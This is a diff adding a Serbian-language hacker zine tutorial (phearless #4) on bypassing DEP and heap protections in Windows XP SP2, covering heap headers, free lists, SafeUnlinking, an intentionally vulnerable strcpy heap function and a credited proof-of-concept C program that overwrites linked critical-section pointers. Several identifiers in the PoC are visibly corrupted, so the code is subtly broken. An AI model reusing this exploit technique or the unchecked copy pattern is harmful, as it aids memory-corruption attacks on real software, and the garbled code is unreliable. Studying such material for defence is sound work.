@@ -1,0 +1,514 @@
+
+                            ...................
+                      ...::: phearless zine #4 :::...
+
+......................>---[ Bypass DEP on Heap ]---<......................
+
+............................>---[ by `and ]---<...........................
+                                          im_happy_icefor[at]yahoo[dot]com
+
+
+   [.1] Intro
+   [.2] DEP ?
+        . HW 
+        . SW
+        . Configuration
+   [.3] HEAP ?
+        . Explain
+        . Under Attack
+   [.4] Exploit ?
+   [.5] Appendix
+        . Linked list
+        . Critical Section
+        . Literatura
+   [.6] Outro
+
+___________________________________________________________________________
+-*==<[ 1. Intro
+...........................................................................
+
+Aham, jos jedan broj phearless-a, i ja kao treba nesto da napisem :), pa 
+evo mislim da je ovo zanimljivo ... isto koliko meni gledanje fudbala, ali
+sta je tu je ! Bacimo se na posao ! Sta vam treba ? Pa treba vam mozak,
+malo predznanja iz ove oblasti (Google u sake), zatim Win XP SP2 (ja ga 
+koristim trenutno), neki compiler, ... ma videcemo sta jos usput !
+     
+    Tip of the day :
+
+    Ako hocete da imate hakersku konzolu uradite sledece :
+
+    \HKEY_CURRENT_USER\Software\Microsoft\Command Processor
+    Key: DefaultColor Value: a
+
+
+A da i obavezno procitajte moje prethodne tutorijale ako niste upoznati sa 
+ovom temom. Mozete ih naci na www.lenaslave.cjb.net
+
+___________________________________________________________________________
+-*==<[ 1. DEP ?
+...........................................................................
+
+
+ Data execution prevention (DEP) je skup hardverskih i softverskih resenja
+ koja su zaduzena za dodatno proveravanje memorije i samim tim sprecavaju
+ izvrsenje sumljivih programa (exploita).
+
+
+->
+Hardverski DEP markira sve memoriske lokacije u procesu kao non-executable,
+izuzev kada je na toj lokaciji stvarno neki izvrsni kod. Postoji vise nacina
+napada tj pokusaja ubacivanja koda u non-executable memoriske lokacije, DEP
+pomaze da se svi pokusaji presretnu i samim tim se desava Exception koji se
+dalje obradjuje ...
+
+Harverski implementiran DEP (ili kako se drugacije naziva Execution 
+Protection (NX)) radi tako sto processor markira memoriju sa atributom
+koji oznacava da cod ne moze biti izvrsen sa te lokacije. Funkcionise na bazi 
+virtuelne memorije, tj najcesce se menja bit (koji oznacava zabranjeno 
+izvrsavanje ili ne) u PTE (Page Table Entry).
+
+DEP se implementira i kod 32-bitnih i 64-bitnih verzija Windowsa, javlja se kod 
+svih nivoa aplikacija, kako kod obicnih usera tako i kod kernel moda i Device
+drivera. U user modu DEP Exception se javlja kao :
+ 
+STATUS_ACCESS_VIOLATION (0xc0000005)
+
+Prvi parametar ExceptionInformation koji se nalazi unutar EXCEPTION_RECORD
+strukture je tip Exceptiona koji se desio. A vrednost 8 u
+ExceptionInformation[] pokazuje da je Exception ustvari "Execution Violation".
+
+Kod vecine processa STATUS_ACCESS_VIOLATION je "unhandled" Exception i 
+rezultira gasenjem procesa.
+
+U kernel modu se ne mogu selektivno markirati memoriske lokacije. Na 32-bitnoj
+verziji Windowsa DEP je primenjen na Stack, dok je kod 64-bitne verzije 
+primenjen na Stack,Paged Pool i Session Pool !
+Device Drivers takodje nisi u mogucnosti da izvrsavaju kod sa Stacka kada je
+ukljucen DEP. DEP access violation u kernel modu rezultira kao:
+
+ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY
+
+
+->
+Softverski implemetiran DEP ( Sandboxing ) je predvidjen da umanji napade 
+exploita koji iskoriscavaju propust u SEH-u (Structured Exception Handler). 
+Implentira se koriscenjem /SafeSEH switcha prilikom compajliranja programa. 
+Vise o ovome imate u ph#3 ili na mojoj web stranici.
+
+->
+DEP se moze podesavati ako nam je to potrebno. Konfiguracija DEP-a se nalazi
+u Boot.ini switchevima i moze se podesavati na sledeci nacin :
+
+Dodavanjem : /noexecute=policy_level gde je policy_level definisan kao :
+AlwaysOn, AlwaysOff, OptIn ili OptOut.
+
+Ili drugi nacin :
+
+1.Click Start, click Control Panel, dupli-click System. 
+2.Click Advanced tab onda, unutar Performance, click Settings. 
+3.Click Data Execution Prevention tab.
+4.Click Turn on DEP for essential Windows programs and services only 
+  ako hocemo OptIn policy.
+5.Click Turn on DEP for all programs and services except those I select 
+  ako hocemo OptOut policy.
+
+
+==============================================================================
+ Policy_Levels features : 
+------------------------------------------------------------------------------
+* OptIn (default configuration)
+Sa ovom opcijom su samo Windowsovi servisi i procesi zasticeni
+------------------------------------------------------------------------------
+* OptOut
+DEP je ukljucen za sve procese ali se moze manuelno iskljucivati za odredjene
+------------------------------------------------------------------------------
+* AlwaysOn
+Uvek ukljucen DEP za sve procese i ne moze se iskljivati sa pojedine
+------------------------------------------------------------------------------
+* AlwaysOff
+Iskljucen svaki vid zastite
+==============================================================================
+
+___________________________________________________________________________
+-*==<[ 3. HEAP ?
+...........................................................................
+
+->
+HEAP je rezervisani adresni prostor, velicine minimum jedne stranice, koju 
+posle heap menadzer moze dinamicki alocirati po potrebi na manje delove.
+Heap menager je ustvari set funkcija za alociranje i oslobadjanje
+memorije koje se nalaze u ntdll.dll i ntoskrnl.exe. 
+Svaki proces u trenutku kreiranja dobija default heap koji je velicine
+1MB i raste prema potrebi.
+
+Heap memorija je organizovana u blokove koje se nazivaju "alocation units"
+ili indexi, koji su 8-byta veliki. Kako aplikacijama treba vise od 8-byta,
+tj vise blokova od po 8-bajta, za svaki skup blokova se kreira specijalni
+"header". Evo malo skicirano :
+
+
+===============================================================
+             Size              |        Previous Size    
+---------------------------------------------------------------
+ Segment Index |     Flags     | Unused       | Tag Index   
+===============================================================
+                           Sl.1 Zauzet header
+
+
+===============================================================
+             Size              |        Previous Size    
+---------------------------------------------------------------
+ Segment Index |     Flags     | Unused       | Tag Index   
+---------------------------------------------------------------
+                             Flink
+---------------------------------------------------------------
+                             Blink 
+===============================================================            
+                           Sl.2 Slobodan header
+
+Gde su :
+
+ Size          - Velicina bloka
+ Previous Size - Prethodna velicina bloka
+ Segment Index - Segmentni index koji pokazuje gde se memoriski
+                 blok nalazi
+ Unused        - Slobodni bajtovi
+ Tag Index     - tag index;
+ Flink         - pointer na sledeci slobodan blok
+ Blink         - pointer na prethodni slobodan blok
+
+ Flags :
+         - 0x01 - HEAP_ENTRY_BUSY
+         - 0x02 - HEAP_ENTRY_EXTRA_PRESENT
+         - 0x04 - HEAP_ENTRY_FILL_PATTERN
+         - 0x08 - HEAP_ENTRY_VIRTUAL_ALLOC
+         - 0x10 - HEAP_ENTRY_LAST_ENTRY
+         - 0x20 - HEAP_ENTRY_SETTABLE_FLAG1
+         - 0x40 - HEAP_ENTRY_SETTABLE_FLAG2
+         - 0x80 - HEAP_ENTRY_SETTABLE_FLAG3
+
+
+Slobodni blokovi memorije su su sortirani po velicini i informacije
+o njima se cuvaju u nizu od 128 doubly-linked-list u heap headeru.
+Tj ako imamo na primer slobodne blokove cija je velicina 17 to znaci
+da ce svi ti blokovi biti smesteni u listu sa indexom 17 ( Freelist[17] ).
+Prvi index se ne koristi zato sto blok od 8 bajta ne moze da postoji a
+index 0 se koristi za blokove vece od 127 alociranih jedinica tj vecih
+od 1016 byta. Kako to izgleda na slici :
+
+ .--------------------.
+ |                    |
+ |    Heap Header     |
+ |                    |
+ |                    |
+ |--------------------|
+ | Free list 0        |
+ |--------------------|
+ | ...                |
+ |--------------------|
+ | Free list 33       | <----> [Free Entry] <----> [Free Entry]
+ |--------------------|
+ | Free list 34       |
+ |--------------------|
+ | ...                |
+ |--------------------|
+ | Free list 127      | <----> [Free Entry]
+ |--------------------|
+ |...                 |
+ |--------------------|
+ | Lookaside list 0   |
+ |--------------------|
+ | Lookaside list 1   |
+ |--------------------|
+ | ...                |
+ |--------------------|
+ | Lookaside list 127 | ----> [Free Entry] ----> [Free Entry] ---> [Null]
+ |--------------------|
+ |                    |
+ '--------------------'
+
+Ako prilikom alokacije heap-a flag HEAP_NO_SERIALIZE nije postavljen
+a HEAP_GROWABLE jeste ( sto je default situacija ), onda da bi se ubrzala
+alokacija malih blokova ( ispod 1016 byta ) creira se single-linked
+lookaside lists. Na pocetku lookaside lista je prazna i raste samo kada
+se oslobadja memorija. Samim tim po defaultu se prilikom alociranja prvo
+proverava lookaside list a tek onda Freelists.
+
+->
+Ajde sada da pogledamo kako izgleda jedna funkcija u kojoj je moguce
+izvrsiti Heap Overflow :
+
+...
+
+HANDLE h = HeapCreate(0, 0, 0); // default flags
+DWORD vulner(LPVOID str)
+
+{
+        LPVOID mem = HeapAlloc(h, 0, 128);
+        // <..>
+        strcpy(mem, str);
+        // <..>
+        return 0;
+}
+
+...
+
+I sada kao sto mozemo videti funkcija vulner() kopira podatke iz stringa
+na koga pokazuje pointer str u alocirani memoriski blok na koga pokazuje
+buf, ali bez provere velicine stringa. A to znaci da ako se string veci od 
+127 bajta preda ovoj funkciji, dogodice se overflow koji ce prebrisati 
+podatke u tom memoriskom bloku. Ako za vreme overflow-a susedni blok postoji
+i ako je free, onda ce se Flink i Blink pointeri prepisati. U trenutku
+brisanja slobodnog bloka ( onog koji smo prepisali ) iz doubly-linked freelist
+desava se sledece :
+
+mov dword ptr [ecx],eax
+mov dword ptr [eax+4],ecx
+
+EAX - Flink
+ECX - Blink
+
+
+ .--------------------.
+ |                    |
+ |    Block Header    |  | O
+ |                    |  | v
+ |                    |  | e
+ |                    |  | r
+ |--------------------|  | f
+ |                    |  | l
+ |    Buffer          |  | o
+ |                    |  | w
+ |                    |  |
+ |--------------------|  | w
+ |    Block Header    |  | a
+ |--------------------|  | y
+ |    Flink           |  |
+ |--------------------|  |
+ |    Blink           |  \/
+ '--------------------'
+
+Znaci moguce je prepisati Flink i Blink Pointere ...
+
+Pazi sad, postoje dva vida zastite\provere Heap-a na overflow, dodata
+u XP SP2, i to su :
+
+1. Prilikom brisanja slobodnog bloka iz freelist, proveravaju se adrese
+   Flink-a i Blink-a. Ovaj postupak se naziva "SafeUnlinking".
+
+2. Ubacuje se controlni cookie, koji se prvoverava prilikom alokacije
+   slobodnog memoriskog bloka.
+
+===============================================================
+             Size              |        Previous Size    
+---------------------------------------------------------------
+ Cookie        |     Flags     | Unused       | Segment Index   
+===============================================================
+
+
+U slucaju da bilo koja od ove dve provere ne prodje dolazi do exeptiona.
+
+___________________________________________________________________________
+-*==<[ 3. Exploit ?
+...........................................................................
+
+Kao sto vidimo veoma je tesko exploisati ovu ranjivost ali je opet moguce
+i to u nekim extremnim situacijama, npr prilikom inicijalizacije nekog
+programa uvek se prvo ucitavaju dll-ovi koje koristi tj alocira se memoriski
+prostor za njih na heap-u. Structura heap-a u tom trenutku izgleda otprilike
+ovako :
+
+ .-----------------------.
+ |     Blok Header       |
+ |-----------------------|
+ |    0     |     x      |
+ |-----------------------|
+ |    A     |     B      |
+ |-----------------------|
+ |    0     |     0      |
+ |-----------------------|
+ |    ?     |     ?      |
+ '-----------------------'
+
+Gde je X CriticalSection ( kriticna sekcija programa ), a A i B su linkovane
+structure. Ako uspemo da izvrsimo overflow u structuri X, mozemo prepisati
+strukture A i B. Tj mozemo prepisati proizvoljnu memorisku adresu. Da bi 
+razumeli zasto DEP ne reaguje na ovaj overflow pogledajmo sledecu sliku :
+
+             |-----------------------------Critical Section
+             \/
+ .-------------------------------.
+ |   0   |   X   |   A   |   B   |
+ '-------------------|-------^---'
+                     |       |
+ .-------------------\/------|---.
+ |   0   |   X   |   A   |   B   |
+ '-------------------------------'
+
+Ovde su A i B linkovane strukture a to znaci da kada doce do brisanja
+criticne sekcije programa ( RtlDeleteCriticalSection() ), dolazi i do brisanja
+linkovanih struktura iz doubly-linked liste, sto dalje znaci sledece :
+
+Moguce je izvrsiti overflow i prepisti proizvoljnu memorisku adresu zbog toga
+sto se ne proveravaju strukture A i B jer su izbrisane iz doubly-linked liste
+prilikom brisanja criticnih sekcija.
+
+I sada jedan PoC kode (by: icolas.falliere@gmail.com ) koji demonstrira ovu 
+tehniku :
+
+#include <windows.h> 
+#include <tlhelp32.h> 
+#include <stdio.h> 
+ 
+ 
+VOID GetChunkList(DWORD *pChunks, INT * bChunks) 
+{ 
+    DWORD          pid; 
+    HANDLE         snapshot; 
+    HEAPLIST32     list; 
+    HEAPENTRY32    entry; 
+    BOOLEAN        bNext; 
+    INT            cnt = 0; 
+ 
+ 
+    pid = GetCurrentProcessId(); 
+ 
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid); 
+    if(snapshot == INVALID_HANDLE_VALUE) 
+    { 
+        printf("[Error] Canot take a heap snapshot\n "); 
+    } 
+    else 
+    { 
+        ZeroMemory(&list, sizeof(list)); 
+        list.dwSize = sizeof(HEAPLIST32); 
+        bNext = Heap32ListFirst(snapshot, &list); 
+         
+        while(bNext) 
+        { 
+            ZeroMemory(&entry, sizeof(entry)); 
+            entry.dwSize = sizeof(HEAPENTRY32); 
+            bNext = Heap32 irst(&entry, list.th32ProcessID, list.th32HeapID); 
+                 
+            while(bNext) 
+            { 
+                pChunks[cnt] = entry.dwAddress; 
+                cnt++; 
+ 
+                ZeroMemory(&entry, sizeof(entry)); 
+                entry.dwSize = sizeof(HEAPENTRY32); 
+                bNext = Heap32Next(&entry);             
+            } 
+ 
+            ZeroMemory(&list, sizeof(list)); 
+            list.dwSize = sizeof(HEAPLIST32); 
+            bNext = Heap32ListNext(snapshot, &list); 
+        } 
+ 
+        CloseHandle(snapshot);
+
+        * bChunks = cnt; 
+    } 
+} 
+ 
+ 
+int main(void) 
+{ 
+    HANDLE   hHeap; 
+    DWORD    pChu ks[500]; 
+    INT      nbChunks; 
+    INT      i; 
+    HMODULE  hLib; 
+    DWORD    *p; 
+     
+     
+    hHeap = GetProcessHeap(); 
+    printf("Default heap: %X\n", hHeap); 
+ 
+    hLib = LoadLibrary("oleaut32.dll"); 
+    printf("LoadLibrary : oleaut32.dll\ "); 
+ 
+    GetChunkList(pChunks, &nbChunks); 
+  
+    for(i = 0; i < nbChunks; i++) 
+    { 
+        // Chunk size is 40 bytes 
+        if(*(WORD *)(pChunks[i] - 8) == 5) 
+        { 
+            p = (DWORD *)(pChunks[i]); 
+ 
+            // Check if  Link and nBLink are there 
+            if(p[2] && p[3]) 
+            { 
+                printf("Structure found at address: %8X\n", p); 
+                printf("Before modification : A=%8X B=%8X\n", p[2], p[3]); 
+                memcpy(p + 2, "AAAABBBB", 8); 
+                printf("After modification  : A=%8X B=%8X\n", p[2], p[3]); 
+                break; 
+            } 
+        } 
+    } 
+ 
+    printf("Press Enter to terminate the program and trigger the access 
+violation\n"); 
+    getchar(); 
+     
+    return 0; 
+}
+
+
+___________________________________________________________________________
+-*==<[ 3. Appendix
+...........................................................................
+
+Da kao neki dodatak da objasnim malo neke stvari ako neko ne zna ...
+
+->
+ Linked list :
+
+ Najjednostavija linkova lista je SingleLinkedList. Tj u svakom elementu liste
+ postoji pointer koji pokazuje na sledeci element. Ili na NULL vrednost u
+ slucaju da je to zadnji element.
+
+ .--.--.    .--.--.         .--.--.    .-.
+ |1 I -|--->|2 I -|---> ... |33I -|--->|x|
+ '--'--'    '--'--'         '--'--'    '-'
+
+ Doubly-linked list je lista koja ima pointer sledeci i prethodni element :
+
+ Prvi element
+ .--.--.--.      .--.--.--.       
+ | x|  |  |<---->|*p|1 |&n| ...
+ '--'--'--'      '--'--'--'
+
+ *p - pointer na prethodni element
+ *n - pointer na sledeci element
+
+
+-> Critical section :
+
+   Deo koda koji pristupa zajednickim objektima se zove kriticna sekcija. 
+   Taj pristup mora da se sinhronizuje, tako da nema zabune kada dve (ili vise)
+   niti ( procesa ) pristupaju ( ili menjaju ) zajednickom objektu.
+
+
+-> Literatura :
+
+   - Defeating Microsoft Windows XP SP2 Heap protection and DEP bypass by
+     Alexander Anisimov
+   
+   - Bypassing Windows heap protections by Nicolas Falliere
+
+   - Windows Heap Overflows by David Litchfield
+
+___________________________________________________________________________
+-*==<[ 3. Outro
+...........................................................................
+
+Pa sta da kazem, txt je mozda malo kratak ali Shat je dao rok i mora se 
+postovati ! Ali ako vas stvarno zanima, razumece te ga ... 
+Ovaj windows sve vise i vise postaje sigurniji, nemam vise tema za pisanje,
+moram da predjem na linux :)
+
+Zahvalnice ide mojim drugarima (ne crew, ne team) sa blackhatz.net, a jedna
+velika palacinka sa plazmom, kremom, i malinama samo mojoj Leni !!!
